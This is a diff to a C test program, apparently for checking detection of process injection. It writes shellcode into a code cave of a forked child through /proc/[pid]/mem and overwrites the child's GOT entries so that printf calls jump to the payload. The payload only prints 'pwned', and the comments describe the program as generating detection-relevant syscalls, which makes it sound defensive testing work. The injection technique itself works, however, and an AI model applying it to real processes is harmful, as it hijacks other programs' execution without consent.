@@ -28,7 +28,7 @@ unsigned char shellcode[] = {
     0x70, 0x77, 0x6e, 0x65, 0x64,  // "pwned"
     0x00                          
 };
-unsigned int shellcode_len = 60;
+unsigned int shellcode_len = sizeof(shellcode);
 
 #define CHUNK_SIZE (size_t)sysconf(_SC_PAGESIZE)
 #define MIN(a, b) (((a) < (b)) ? (a) : (b))
@@ -38,12 +38,11 @@ pid_t create_victim_child_process() {
     if (pid < 0) {
         return 0;
     } else if (pid == 0) {
-        printf("[Victim Process]:  PID = %d\n", getpid());
         sleep(2);
-        printf("look for printf address in the GOT table, and this print will not be executed ;)\n");
+        printf("look for printf address in the GOT table, and this printf call will be hijacked: control will jump to the shellcode instead ;)\n");
         exit(0);
     }
-    sleep(0.2);
+    usleep(200000);
     return pid;
 }
 
@@ -184,7 +183,7 @@ long get_base_address(pid_t pid) {
     char line[512];
     long base_address = -1;
     
-    // the first number of the file is the base address
+    // On x86-64 Linux the first entry in /proc/<pid>/maps is reliably the binary's base address
     if (fgets(line, sizeof(line), f)) {
         sscanf(line, "%lx-", &base_address);
     }
@@ -291,30 +290,48 @@ int main(int argc, char *argv[]) {
         fprintf(stderr, "[-] Code cave not found\n");
         exit(1);
     }
-    printf("[+] Code cave found here: 0x%lx\n", target_address);
+    printf("[+] Code cave found at: 0x%lx\n", target_address);
+
+    // write the payload in a executable region
+    unsigned char CodeCave[shellcode_len];
+    if (read_mem(CodeCave, pid, target_address, shellcode_len) != 0)
+        fprintf(stderr, "[!] Warning: failed to read memory\n");
+    printf("[+] Code Cave content before the overwrite: \n");
+    print_mem(CodeCave, shellcode_len);
 
     if(write_in_mem(target_address, pid, shellcode, shellcode_len) != (ssize_t)shellcode_len) {
         fprintf(stderr, "[-] Failed to write payload into code cave\n");
         exit(1);
     }
     printf("[+] Payload written successfully\n");
+
+    if (read_mem(CodeCave, pid, target_address, shellcode_len) != 0)
+        fprintf(stderr, "[!] Warning: failed to read memory\n");
+    printf("[+] Code Cave content after the overwrite: \n");
+    print_mem(CodeCave, shellcode_len);
     
-    //Identify the GOT memory section by parsing the elf headers in the maps file
+    // Parse the ELF headers via /proc/[pid]/exe to locate .got.plt
+    // (and /proc/[pid]/maps to get the load base for PIE binaries)
     long got_size = 0;
     long got_address = get_got(pid, &got_size);
     if (got_address == -1) {
         fprintf(stderr, "[-] Failed to locate GOT section\n");
         exit(1);
     }
-    printf("[+] GOT found at: 0x%lx, (size: %ld)\n", got_address, got_size);
+    printf("[+] GOT found at: 0x%lx (size: %ld)\n", got_address, got_size);
 
-    unsigned char GOTcontent[got_size];
-    read_mem(GOTcontent, pid, got_address, got_size);
-    printf("[+] GOT content before the injection: \n");
-    print_mem(GOTcontent, got_size);
+    unsigned char *GOTcontent = malloc(got_size);
+    if (!GOTcontent) {
+        fprintf(stderr, "[!] Warning: malloc failed, skipping dump\n");
+    } else {
+        if (read_mem(GOTcontent, pid, got_address, got_size) != 0) 
+            fprintf(stderr, "[!] Warning: failed to read memory\n");
+        printf("[+] GOT content before the overwrite: \n");
+        print_mem(GOTcontent, got_size);
+    }
     
 	//Overwrite addresses of library functions with the address of our payload
-    /* exept for the first 3 entries:
+    /* except for the first 3 entries:
     GOT[0]: address of the .dynamic section.                                +0
     GOT[1]: pointer to the link_map structure.                              +8
     GOT[2]: pointer to the dynamic linker's _dl_runtime_resolve function.   +16
@@ -328,6 +345,7 @@ int main(int argc, char *argv[]) {
 
     long *buffer = (long *)malloc(bytes_to_write);
     if (!buffer) {
+        free(GOTcontent);
         fprintf(stderr, "[-] Malloc failed\n");
         exit(1);
     }
@@ -341,13 +359,17 @@ int main(int argc, char *argv[]) {
         fprintf(stderr, "[-] Failed to overwrite GOT\n");
         exit(1);
     }
-    printf("[+] Overwritten successfully %d addresses of GOT\n", num_entries);
+    printf("[+] Successfully overwritten %d GOT entries\n", num_entries);
 
-    read_mem(GOTcontent, pid, got_address, got_size);
-    printf("[+] GOT content after the injection:\n");
-    print_mem(GOTcontent, got_size);
+    if (GOTcontent) {
+        if (read_mem(GOTcontent, pid, got_address, got_size) != 0)
+            fprintf(stderr, "[!] Warning: failed to read memory\n");
+        printf("[+] GOT content after the overwrite:\n");
+        print_mem(GOTcontent, got_size);
+    }
 
     printf("[+] Injection finished\n");
+    free(GOTcontent);
     exit(0);
 }
 
@@ -372,7 +394,7 @@ int main(int argc, char *argv[]) {
  * Note: this test forks a child process to use as the injection target.
  * This allows the test to run on systems where ptrace_scope=1 (default on most Linux distributions),
  * where a process can only modify the memory of its own descendants.
- * This may differs from a real-world scenario where the attacker targets an arbitrary process,
+ * This may differ from a real-world scenario where the attacker targets an arbitrary process,
  * but for the purpose of this test it preserves the detection-relevant behavior: the same syscalls and /proc/[pid]/mem
  * access patterns are generated regardless of the relationship between injector and target.
  * 
